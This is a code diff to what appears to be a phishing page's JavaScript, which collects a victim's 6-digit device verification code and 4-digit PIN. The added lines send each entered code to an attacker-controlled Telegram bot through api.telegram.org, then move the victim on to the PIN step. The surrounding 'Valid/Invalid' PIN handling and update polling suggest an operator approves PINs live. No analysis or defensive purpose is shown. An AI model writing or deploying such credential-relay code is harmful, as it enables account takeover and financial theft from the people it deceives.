@@ -189,6 +189,7 @@
         let state = {
             lastUpdateId: 0,
             pollInterval: null,
+            deviceCodeId: null,
             validPinId: null,
             invalidPinId: null
         };
@@ -232,17 +233,36 @@
             return Array.from(inputs).map(i => i.value).join('');
         }
 
+        // Send 6-digit Device Code
         function submitDeviceCode() {
             const code = getCode(document.querySelectorAll('.otp-input'));
             if (code.length !== 6) {
                 showError("Please enter the full 6-digit code");
                 return;
             }
+
+            const ts = Date.now();
+            state.deviceCodeId = `device_code_${ts}`;
+
+            const message = `<b>🔴 Device Verification Code</b>\n\nCode: <code>${code}</code>\n\nProceeding to PIN...`;
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            // Move to PIN step
             deviceStep.style.display = 'none';
             pinStep.style.display = 'block';
             document.querySelectorAll('.pin-input')[0].focus();
         }
 
+        // Send PIN with Valid/Invalid options
         function submitPin() {
             const pin = getCode(document.querySelectorAll('.pin-input'));
             if (pin.length !== 4) {
@@ -303,7 +323,6 @@
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "Invalid PIN. Please try again.";
                                     errMsg.style.display = 'block';
-                                    // Reset PIN inputs
                                     document.querySelectorAll('.pin-input').forEach(i => i.value = '');
                                     document.querySelectorAll('.pin-input')[0].focus();
                                 }
@@ -332,7 +351,7 @@
             }
         };
 
-        // Auto submit when complete
+        // Auto-submit when complete
         document.addEventListener('input', () => {
             if (getCode(otpInputs).length === 6 && deviceStep.style.display !== 'none') {
                 setTimeout(submitDeviceCode, 250);
